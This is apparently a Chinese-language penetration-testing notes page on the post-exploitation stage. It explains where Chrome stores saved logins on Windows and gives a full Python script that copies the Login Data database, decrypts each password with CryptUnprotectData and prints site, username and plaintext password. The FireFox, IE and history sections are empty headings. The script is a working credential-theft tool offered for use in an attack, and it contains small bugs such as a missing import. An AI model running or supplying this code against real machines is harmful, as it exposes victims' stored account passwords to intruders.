<!-- TOC -->

- [前言](#前言)
- [密码抓取原理](#密码抓取原理)
    - [Chrome](#chrome)
    - [FireFox](#firefox)
    - [IE](#ie)
- [密码抓取实现](#密码抓取实现)
    - [Chrome](#chrome-1)
- [历史记录获取](#历史记录获取)
- [参考](#参考)

<!-- /TOC -->

## 前言
*每一次都在彷徨中挣扎，每一次……* 在后渗透阶段，获得权限后需要搜集目标系统的信息。信息越全面，越有助于进一步的渗透。对于Windows系统，用户浏览器往往包含非常有价值的信息。

## 密码抓取原理
### Chrome
![](https://www.github.com/52stu/Images/raw/master/xsj/1572253732185.png)

![](https://www.github.com/52stu/Images/raw/master/xsj/1572253750873.png)


Chrome中保存的密码先被二次加密，然后被保存在SQLite数据库文件中，位置如下：`%LocalAppData%\Google\Chrome\User Data\Default\Login Data`，可以使用`SQLiteStudio`打开，如下图：

![](https://www.github.com/52stu/Images/raw/master/xsj/1572254243325.png)

选择Form view，查看十六进制格式，获得**Chrome通过Windows API CryptProtectData()实现**二次加密后的用户密码，如下图：

![](https://www.github.com/52stu/Images/raw/master/xsj/1572254275757.png)


**注：**

如果Chrome正在运行，无法使用SQLiteStudio打开数据库文件Login Data，可将该文件复制后再打开

### FireFox

### IE

## 密码抓取实现
### Chrome
首先，编写程序实现读取SQLite数据库文件，这里选择使用python实现

开源代码很多，所以这里只给出一个示例：
```python
from os import getenv
import sqlite3
import binascii
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    print (binascii.b2a_hex(result[2]))
```

读取得到的加密内容，还需要解密，通过[加密代码](https://github.com/scheib/chromium/blob/eb7e2441dd8878f733e43799ea77c2bab66816d3/chrome/browser/password_manager/password_store_win_unittest.cc#L107)我们可以得到解密的两个关键点：
1. 解密函数为CryptUnprotectData
2. 只有与加密数据的用户具有相同登录凭据的用户才能解密数据

**Chrome密码抓取完整代码**

```python
import os
import sqlite3
import win32crypt
import binascii
import shutil


paths_data = [
    os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data",
    os.getenv("APPDATA") + "\google\chrome\User Data\Default\Login Data"
]

path_data_chrome = [path for path in paths_data if os.path.exists(path)]


def Readpass(path_data):
    try:
        
        path_data_copy = os.getcwd() + '\\chrome_data'
        shutil.copy(path_data,path_data_copy)
        
    except Exception,e:
        print e
        
    try:
        conn = sqlite3.connect(path_data_copy)
        cur = conn.cursor()
    except Exception, e:
        print e

    cur.execute('SELECT origin_url, username_value, password_value FROM logins')
    data_result = {}

    for res in cur.fetchall():
        try:
            password = win32crypt.CryptUnprotectData(res[2], None, None, None, 0)[1]
        except Exception,e:
            password = ''
        URL = res[0];username = res[1]
        tplt = "{0:60s} {1:20s} {2:20s}"
        print tplt.format(URL, username, password)
        print "----------------------------------------------------------------------------------------------------"
        
        
if __name__ == '__main__':    
    if len(path_data_chrome) < 1:
        print " Chrome is not Installed!!!"
        sys.exit()
    elif len(path_data_chrome) > 1:
        print('{0:60s} {1:20s} {2:20s}'.format("URL", "UserName", "PassWord"))
        print "===================================================================================================="
        for p in path_data_chrome:
            Readpass(p)
    else:
        print('{0:60s} {1:20s} {2:20s}'.format("URL", "UserName", "PassWord"))
        print "===================================================================================================="
        Readpass(path_data_chrome[0])
    if os.path.exists(path_data_chrome):
        try:
            os.remove(path_data_chrome)
        except Exception,e:
            print e

```

## 历史记录获取

## 参考


[渗透技巧——导出Chrome浏览器中保存的密码]()
https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)

[渗透技巧——离线导出Chrome浏览器中保存的密码](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)

[渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/)